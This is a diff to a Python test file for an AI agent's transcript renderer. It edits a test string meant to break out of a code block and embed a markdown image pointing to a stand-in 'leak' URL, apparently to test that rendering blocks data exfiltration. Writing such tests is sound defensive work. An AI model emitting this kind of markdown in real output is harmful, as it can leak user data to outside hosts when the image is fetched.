@@ -14,7 +14,7 @@ from agentic_bi.agent.cli import printable
 from agentic_bi.agent.transcript import render_markdown, slug, write_transcript
 
 # An answer that tries to break out of a code block and make a Markdown viewer fetch a URL.
-SNEAKY = "Done.\n````\n![x](https://example.invalid/leak?d=1) and [link](https://example.invalid)"
+SNEAKY = "Done.\n````\n![x](https://example.invalid/leak?d=x) and [link](https://example.invalid)"
 FY = {"start": "2024-10-01", "end": "2025-09-30"}
 
 
